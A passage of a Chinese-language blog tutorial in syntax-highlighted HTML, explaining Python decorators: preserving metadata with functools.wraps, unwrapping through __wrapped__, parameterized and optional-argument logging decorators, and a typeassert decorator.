python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@timethis</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">countdown</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>其实类似于下面这种写法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">countdown</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">countdown = timethis(countdown)</span><br></pre></td></tr></table></figure><p>顺便说一下，内置的装饰器比如<code>@staticmethod</code>,<code>@classmethod</code>,<code>@property</code>原理也是一样的。例如，下面这两个代码片段是等价的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">method</span><span class="params">(cls)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">method</span><span class="params">(cls)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    method = classmethod(method)</span><br></pre></td></tr></table></figure><p>在上面的<code>wrapper()</code>函数中， 装饰器内部定义了一个使用<code>*args</code>和<code>**kwargs</code>来接受任意参数的函数。在这个函数里面调用了原始函数并将其结果返回，不过你还可以添加其他额外的代码(比如计时)。 然后这个新的函数包装器被作为结果返回来代替原始函数。</p><p>需要强调的是装饰器并不会修改原始函数的参数签名以及返回值。使用<code>*args</code>和<code>**kwargs</code>目的就是确保任何参数都能适用。而返回结果值基本都是调用原始函数<code>func(*args, **kwargs)</code>的返回结果，其中<code>func</code>就是原始函数。</p><p>刚开始学习装饰器的时候，会使用一些简单的例子来说明，比如上面演示的这个。不过实际场景使用时，还是有一些细节问题要注意的。比如上面使用<code>@wraps(func)</code>注解是很重要的，它能保留原始函数的元数据。</p><h4 id="创建装饰器时保留函数元信息"><a href="#创建装饰器时保留函数元信息" class="headerlink" title="创建装饰器时保留函数元信息"></a>创建装饰器时保留函数元信息</h4><p>任何时候你定义装饰器的时候，都应该使用<code>functools</code>库中的<code>@wraps</code>装饰器来注解底层包装函数。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">timethis</span><span class="params">(func)</span>:</span></span><br><span class="line"><span class="meta">    @wraps(func)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">        start = time.time()</span><br><span class="line">        result = func(*args, **kwargs)</span><br><span class="line">        end = time.time()</span><br><span class="line">        print(func.__name__, end-start)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br></pre></td></tr></table></figure><p>下面我们使用这个被包装后的函数并检查它的元信息：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>@timethis</span><br><span class="line"><span class="meta">... </span><span class="function"><span class="keyword">def</span> <span class="title">countdown</span><span class="params">(n)</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="string">'''</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    Counts down</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    '''</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line"><span class="meta">... </span>        n -= <span class="number">1</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>countdown(<span class="number">100000</span>)</span><br><span class="line">countdown <span class="number">0.008917808532714844</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>countdown.__name__</span><br><span class="line"><span class="string">'countdown'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>countdown.__doc__</span><br><span class="line"><span class="string">'\n\tCounts down\n\t'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>countdown.__annotations__</span><br><span class="line">&#123;<span class="string">'n'</span>: &lt;<span class="class"><span class="keyword">class</span> '<span class="title">int</span>'&gt;&#125;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure><p>在编写装饰器的时候复制元信息是一个非常重要的部分。如果你忘记了使用<code>@wraps</code>， 那么你会发现被装饰函数丢失了所有有用的信息。比如如果忽略<code>@wraps</code>后的效果是下面这样的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>countdown.__name__</span><br><span class="line"><span class="string">'wrapper'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>countdown.__doc__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>countdown.__annotations__</span><br><span class="line">&#123;&#125;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p><code>@wraps</code>有一个重要特征是它能让你通过属性<code>__wrapped__</code>直接访问被包装函数。例如:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>countdown.__wrapped__(<span class="number">100000</span>)</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h4 id="解除一个装饰器"><a href="#解除一个装饰器" class="headerlink" title="解除一个装饰器"></a>解除一个装饰器</h4><p>现在一个装饰器已经作用在一个函数上，你想撤销它，直接访问原始的未包装的那个函数。假设装饰器是通过<code>@wraps</code>来实现的，那么你可以通过访问<code>__wrapped__</code>属性来访问原始函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>@somedecorator</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(x, y)</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> x + y</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>orig_add = add.__wrapped__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>orig_add(<span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line"><span class="number">7</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>直接访问未包装的原始函数在调试、内省和其他函数操作时是很有用的。但是这里的方案仅仅适用于在包装器中正确使用了<code>@wraps</code>或者直接设置了<code>__wrapped__</code>属性的情况。</p><p>如果有多个包装器，那么访问<code>__wrapped__</code>属性的行为是不可预知的，应该避免这样做。在<code>Python3.3</code>中，它会略过所有的包装层，比如，假如你有如下的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decorator1</span><span class="params">(func)</span>:</span></span><br><span class="line"><span class="meta">    @wraps(func)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">        print(<span class="string">'Decorator 1'</span>)</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decorator2</span><span class="params">(func)</span>:</span></span><br><span class="line"><span class="meta">    @wraps(func)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">        print(<span class="string">'Decorator 2'</span>)</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@decorator1</span></span><br><span class="line"><span class="meta">@decorator2</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x + y</span><br></pre></td></tr></table></figure><p>在<code>Python3.3</code>测试如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>add(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">Decorator <span class="number">1</span></span><br><span class="line">Decorator <span class="number">2</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>add.__wrapped__(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="number">5</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>在<code>Python3.4</code>测试如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>add(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">Decorator <span class="number">1</span></span><br><span class="line">Decorator <span class="number">2</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>add.__wrapped__(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">Decorator <span class="number">2</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>需要注意的是，并不是所有的装饰器都使用了<code>@wraps</code>，因此这里的方案并不全部使用，特别的，内置的装饰器<code>@staticmethod</code>和<code>@classmethod</code>就没有遵循这个约定。</p><h4 id="定义一个带参数的装饰器"><a href="#定义一个带参数的装饰器" class="headerlink" title="定义一个带参数的装饰器"></a>定义一个带参数的装饰器</h4><p>我们用一个例子详细阐述下接受参数的处理过程。假设你想写一个装饰器，给函数添加日志功能，同时允许用户指定日志的级别和其他的选项。下面是这个装饰器的定义和使用示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logged</span><span class="params">(level, name=None, message=None)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorate</span><span class="params">(func)</span>:</span></span><br><span class="line">        logname = name <span class="keyword">if</span> name <span class="keyword">else</span> func.__module__</span><br><span class="line">        log = logging.getLogger(logname)</span><br><span class="line">        logmsg = message <span class="keyword">if</span> message <span class="keyword">else</span> func.__name__</span><br><span class="line"></span><br><span class="line"><span class="meta">        @wraps(func)</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">            log.log(level, logmsg)</span><br><span class="line">            <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">        <span class="keyword">return</span> wrapper</span><br><span class="line">    <span class="keyword">return</span> decorate</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用示例</span></span><br><span class="line"><span class="meta">@logged(logging.DEBUG)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line"></span><br><span class="line"><span class="meta">@logged(logging.CRITICAL, 'example')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spam</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'Spam!'</span>)</span><br></pre></td></tr></table></figure><p>初看这种实现看上去很复杂，但是核心思想很简单。最外层的函数<code>logged()</code>接受参数并将它们作用在内部的装饰器函数上面。内层的函数<code>decorate()</code>接受一个函数作为参数，然后在函数上面放置一个包装器。这里的关键点是包装器是可以使用传递给<code>logged()</code>的参数的。</p><h4 id="可自定义属性的装饰器"><a href="#可自定义属性的装饰器" class="headerlink" title="可自定义属性的装饰器"></a>可自定义属性的装饰器</h4><p>如果想写一个装饰器来包装一个函数，并且允许用户提供参数在运行时控制装饰器行为。可以引入一个访问函数，使用<code>nonlocal</code>来修改内部变量。然后这个访问函数被作为一个属性赋值给包装函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps, partial</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attach_wrapper</span><span class="params">(obj, func=None)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> partial(attach_wrapper, obj)</span><br><span class="line">    setattr(obj, func.__name__, func)</span><br><span class="line">    <span class="keyword">return</span> func</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logged</span><span class="params">(level, name=None, message=None)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorate</span><span class="params">(func)</span>:</span></span><br><span class="line">        logname = name <span class="keyword">if</span> name <span class="keyword">else</span> func.__module__</span><br><span class="line">        log = logging.getLogger(logname)</span><br><span class="line">        logmsg = message <span class="keyword">if</span> message <span class="keyword">else</span> func.__name__</span><br><span class="line"></span><br><span class="line"><span class="meta">        @wraps(func)</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">            log.log(level, logmsg)</span><br><span class="line">            <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line"></span><br><span class="line"><span class="meta">        @attach_wrapper(wrapper)</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">set_level</span><span class="params">(newlevel)</span>:</span></span><br><span class="line">            <span class="keyword">nonlocal</span> level</span><br><span class="line">            level = newlevel</span><br><span class="line"></span><br><span class="line"><span class="meta">        @attach_wrapper(wrapper)</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">set_message</span><span class="params">(newmsg)</span>:</span></span><br><span class="line">            <span class="keyword">nonlocal</span> logmsg</span><br><span class="line">            logmsg = newmsg</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decorate</span><br><span class="line"></span><br><span class="line"><span class="meta">@logged(logging.DEBUG)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line"></span><br><span class="line"><span class="meta">@logged(logging.CRITICAL, 'example')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spam</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'Spam!'</span>)</span><br></pre></td></tr></table></figure><p>下面是交互环境下的使用例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> logging</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>logging.basicConfig(level=logging.DEBUG)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>add(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">DEBUG:__main__:add</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># Change the log message</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>add.set_message(<span class="string">'Add called'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>add(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">DEBUG:__main__:Add called</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># Change the log level</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>add.set_level(logging.WARNING)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>add(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">WARNING:__main__:Add called</span><br><span class="line"><span class="number">5</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>这一小节的关键点在于访问函数(如<code>set_message()</code>和<code>set_level()</code>)，它们被作为属性赋给包装器。每个访问函数允许使用<code>nonlocal</code>来修改函数内部的变量。</p><h4 id="带可选参数的装饰器"><a href="#带可选参数的装饰器" class="headerlink" title="带可选参数的装饰器"></a>带可选参数的装饰器</h4><p>如果想写一个装饰器，既可以不传参数给它，比如<code>@decorator</code>， 也可以传递可选参数给它，比如<code>@decorator(x,y,z)</code>。示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps, partial</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logged</span><span class="params">(func=None, *, level=logging.DEBUG, name=None, message=None)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> partial(logged, level=level, name=name, message=message)</span><br><span class="line"></span><br><span class="line">    logname = name <span class="keyword">if</span> name <span class="keyword">else</span> func.__module__</span><br><span class="line">    log = logging.getLogger(logname)</span><br><span class="line">    logmsg = message <span class="keyword">if</span> message <span class="keyword">else</span> func.__name__</span><br><span class="line"></span><br><span class="line"><span class="meta">    @wraps(func)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">        log.log(level, logmsg)</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example use</span></span><br><span class="line"><span class="meta">@logged</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line"></span><br><span class="line"><span class="meta">@logged(level=logging.CRITICAL, name='example')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spam</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'Spam!'</span>)</span><br></pre></td></tr></table></figure><p>可以看到，<code>@logged</code>装饰器可以同时不带参数或带参数。</p><h4 id="利用装饰器强制函数上的类型检查"><a href="#利用装饰器强制函数上的类型检查" class="headerlink" title="利用装饰器强制函数上的类型检查"></a>利用装饰器强制函数上的类型检查</h4><p>这里的目标是能对函数参数类型进行断言，类似下面这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>@typeassert(int, int)</span><br><span class="line"><span class="meta">... </span><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(x, y)</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> x + y</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>add(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>add(<span class="number">2</span>, <span class="string">'hello'</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">    File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    File <span class="string">"contract.py"</span>, line <span class="number">33</span>, <span class="keyword">in</span> wrapper</span><br><span class="line">TypeError: Argument y must be &lt;<span class="class"><span class="keyword">class</span> '<span class="title">int</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure><p>下面是使用装饰器技术来实现<code>@typeassert</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> inspect <span class="keyword">import</span> signature</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">typeassert</span><span class="params">(*ty_args, **ty_kwargs)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorate</span><span class="params">(func)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> __debug__:</span><br><span class="line">            <span class="keyword">return</span> func</span><br><span class="line"></span><br><span class="line">        sig = signature(func)</span><br><span class="line">        bound_types = sig.bind_partial(*ty_args, **ty_kwargs).arguments</span><br><span class="line"></span><br><span class="line"><span class="meta">        @wraps(func)</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">            bound_values = sig.bind(*args, **kwargs)</span><br><span class="line">            <span class="keyword">for</span> name, value <span class="keyword">in</span> bound_values.arguments.items():</span><br><span class="line">                <span class="keyword">if</span> name <span class="keyword">in</span> bound_types:</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> isinstance(value, bound_types[name]):</span><br><span class="line">                        <span class="keyword">raise</span> TypeError(</span><br><span class="line">                            <span class="string">'Argument &#123;&#125; must be &#123;&#125;'</span>.format(name, bound_types[name])</span><br><span class="line">                            )</span><br><span class="line">            <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">        <span class="keyword">return</span> wrapper</span><br><span class="line">    <span class="keyword">return</span> decorate</span><br></pre></td></tr></table></figure><p>可以看出这个装饰器非常灵活，既可以指定所有参数类型，也可以只指定部分。并且可以通过位置或关键字来指定参数类型。下面是使用示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>@typeassert(int, z=int)</span><br><span class="line"><span class="meta">... </span><span class="function"><span class="keyword">def</span> <span class="title">spam</span><span class="params">(x, y, z=<span class="number">42</span>)</span>:</span></span><br><span class="line"><span class="meta">... </span>    print(x, y, z)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>spam(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>spam(<span class="number">1</span>, <span class="string">'hello'</span>, <span class="number">3</span>)</span><br><span class="line"><span class="number">1</span> hello <span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>spam(<span class="number">1</span>, <span class="string">'hello'</span>, <span class="string">'world'</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">File <span class="string">"contract.py"</span>, line <span class="number">33</span>, <span class="keyword">in</span> wrapper</span><br><span class="line">TypeError: Argument z must be &lt;<span class="class"><span class="keyword">class</span> '<span class="title">int</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure><h4 id="将装饰器定义为类的一部分"><a href="#将装饰器定义为类的一部分" class="headerlink" title="将装饰器定义为类的一部分"></a>将装饰器定义为类的一部分</h4><p>如果想在类中定义装饰器，并将其作用在其他函数或方法上。首先要确认它的使用方式，比如到底是作为一个实例方法还是类方法，示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 